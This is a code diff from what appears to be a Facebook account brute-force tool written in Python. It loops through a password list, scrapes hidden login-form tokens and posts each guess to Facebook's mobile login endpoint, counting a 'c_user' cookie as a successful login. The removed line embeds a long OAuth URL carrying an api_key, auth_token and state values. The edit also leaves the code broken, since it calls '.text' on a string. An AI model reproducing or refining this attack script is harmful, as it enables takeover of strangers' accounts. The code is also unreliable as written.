@@ -187,7 +187,7 @@ class System:
                 'referer': 'https://mtouch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
                 'accept-encoding': 'gzip, deflate, br',
                 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
-                login_url = "https://mbasic.facebook.com/login/device-based/login/async/?api_key=779900868722692&auth_token=af06de30d9acd77f7bbc31679fd0f694&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fclient_id%3D779900868722692%26redirect_uri%3Dhttps%253A%252F%252Funsplash.com%252Fnlog%252Ffacebook%26response_type%3Dcode%26scope%3Demail%2Bpublic_profile%26state%3DeyJyZWZlcnJlciI6Ii9zL3Bob3Rvcy9waG90byIsInJlZmVycmVyX2xvY2FsZSI6ImVuLVVTIiwiY3NyZl90b2tlbiI6IkVqMnhVNDVsU05WaW5tNTUtQmJWNmU5NjYyS3NSVzlsUjlrOWpJczQ1TU1EWTJabnBvN1BLNTlyUFZOVSJ9%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd7d150ac-7c93-4a51-8f6b-42aa40ac651f%26tp%3Dunspecified&refsrc=deprecated&app_id=779900868722692&cancel=https%3A%2F%2Funsplash.com%2Fnlog%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJyZWZlcnJlciI6Ii9zL3Bob3Rvcy9waG90byIsInJlZmVycmVyX2xvY2FsZSI6ImVuLVVTIiwiY3NyZl90b2tlbiI6IkVqMnhVNDVsU05WaW5tNTUtQmJWNmU5NjYyS3NSVzlsUjlrOWpJczQ1TU1EWTJabnBvN1BLNTlyUFZOVSJ9%23_%3D_&lwv=100"
+                login_url = "https://mtouch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
                 response = ses.post(url=login_url, data=data, headers=headers)
                 log_cookies = ses.cookies.get_dict().keys()
                 if "c_user" in log_cookies:
@@ -216,7 +216,7 @@ class System:
         try:
             for pas in passlist:
                 url = "https://touch.facebook.com/"
-                curl = ses.get(url)
+                curl = ses.get(url).text
                 data = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(curl.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(curl.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': ids, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(curl.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(curl.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
                 headers = {
                 'authority': 'www.facebook.com',
